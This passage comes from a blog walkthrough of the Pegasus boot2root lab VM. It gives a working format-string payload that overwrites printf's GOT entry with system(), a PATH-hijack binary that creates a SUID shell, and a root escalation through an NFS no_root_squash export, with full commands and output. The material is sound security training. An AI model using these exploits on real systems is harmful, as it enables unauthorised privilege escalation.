+mike@pegasus:~$ file t
+t: data
+
+# then, in gdb, we will grab the output of the new file called
+# t, and redirect it as input to my_first
+mike@pegasus:~$ gdb -q ./my_first
+Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
+
+# leak the current address that GOT points to for printf()
+(gdb) x/x 0x08049bfc
+0x8049bfc &lt;printf@got.plt&gt;: 0x080483b6
+
+# run the binary with our exploit (t) as input
+(gdb) r &lt; t
+Starting program: /home/mike/my_first &lt; t
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Error details: ��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000004 in ?? ()
+
+# inspect the new address the GOT points to for printf()
+(gdb) x/x 0x08049bfc
+0x8049bfc &lt;printf@got.plt&gt;: 0x00000004
+(gdb)
+</code></pre>
+
+<p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>
+
+<pre><code class="language-bash"># prep the input file
+mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' &gt; t
+mike@pegasus:~$
+
+# run it in the debugger
+(gdb) r &lt;t
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/mike/my_first &lt;t
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Error details: ����
+
+[... snip ...]
+
+sh: 1: Selection:: not found
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08c3f98c in ?? ()
+
+# check where the GOT points to for printf()
+(gdb) x/x 0x08049bfc
+0x8049bfc &lt;printf@got.plt&gt;: 0x40069060
+
+# confirm system() is still there :)
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
+</code></pre>
+
+<p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system(&quot;Selection:&quot;)</code> instead of <code>printf(&quot;Selection:&quot;)</code> due to the GOT override.</p>
+
+<h4 id="finishing-the-exploit:2909c52a557f765558fa015a0dc1703a">finishing the exploit</h4>
+
+<p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>
+
+<p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>
+
+<pre><code class="language-bash"># Prep Selection: to make a SUID shell for john
+# and modify PATH
+mike@pegasus:~$ cat tojohn.c
+#include &lt;stdio.h&gt;
+int main()
+{
+    system(&quot;cp /bin/sh /tmp/tojohn&quot;);
+    system(&quot;chmod 4777 /tmp/tojohn&quot;);
+}
+mike@pegasus:~$ gcc tojohn.c -o &quot;Selection:&quot;
+mike@pegasus:~$ export PATH=/home/mike/:$PATH
+
+# run the exploit...
+mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' | ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Error details: ����
+
+                     10
+Segmentation fault (core dumped)
+
+# ... and check /tmp
+mike@pegasus:~$ ls -lah /tmp/
+total 108K
+drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
+drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
+-rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
+mike@pegasus:~$
+</code></pre>
+
+<p>We have a new file <code>tojohn</code> in <code>/tmp</code> :D</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ /tmp/tojohn
+$ id
+uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
+</code></pre>
+
+<h2 id="hoofing-rooting-pegasus:2909c52a557f765558fa015a0dc1703a">hoofing (rooting) Pegasus</h2>
+
+<p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>
+
+<p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>
+
+<pre><code class="language-bash">john@pegasus:~$ sudo -l
+Matching Defaults entries for john on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User john may run the following commands on this host:
+    (root) NOPASSWD: /usr/local/sbin/nfs
+john@pegasus:~$ sudo nfs
+Usage: nfs [start|stop]
+john@pegasus:~$ sudo nfs start
+ * Exporting directories for NFS kernel daemon...                                                                                                                                 [ OK ]
+ * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
+john@pegasus:~$
+</code></pre>
+
+<p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>
+
+<p>So, I mounted the share&hellip;</p>
+
+<pre><code class="language-bash">root@kali:~# mkdir nfs
+root@kali:~# mount 192.168.56.101:/opt/nfs nfs
+</code></pre>
+
+<p>&hellip; prepped a SUID shell &hellip;</p>
+
+<pre><code class="language-bash">root@kali:~/Desktop/pegasus/nfs# cat shell.c
+#include &lt;stdio.h&gt;
+
+int main()
+{
+    setuid(0);
+    setgid(0);
+    system(&quot;/bin/sh&quot;);
+}
+root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
+root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
+root@kali:~/Desktop/pegasus/nfs# ls -lah
+total 20K
+drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
+drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
+-rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
+-rw-r--r-- 1 root root   79 Dec 23 14:39 shell.c
+</code></pre>
+
+<p>&hellip; and rooted Pegasus :)</p>
+
+<pre><code class="language-bash">john@pegasus:~$ /opt/nfs/shell
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(john)
+</code></pre>
+
+<h2 id="flag:2909c52a557f765558fa015a0dc1703a">flag :)</h2>
+
+<pre><code class="language-text"># cat /root/flag
+               ,
+               |`\
+              /'_/_
+            ,'_/\_/\_                       ,
+          ,'_/\'_\_,/_                    ,'|
+        ,'_/\_'_ \_ \_/                _,-'_/
+      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
+    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
+   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
+    \_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
+     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
+      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
+        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
+      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
+     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
+      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
+       \_)   &gt;        `\_                           It was a hardware clone of
+            /  `,      |`\_                         the Nintendo Famicom.
+           /    \     / \ `\
+          /   __/|   /  /  `\
+         (`  (   (` (_  \   /
+         /  ,/    |  /  /   \
+        / ,/      | /   \   `\_
+      _/_/        |/    /__/,_/
+     /_(         /_(
+
+
+CONGRATULATIONS! You made it :)
+
+Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
+learnt a thing or two while doing it! :)
+
+Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
+providing first review.
+
+Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
+and leave some feedback, I would love to hear from you!
+
+Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
+more awesome boot2root VMs!
+</code></pre>
+
+<p>Thanks for the fun <a href="https://twitter.com/theknapsy">@TheKnapsy</a></p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+</body>
+</html>
+
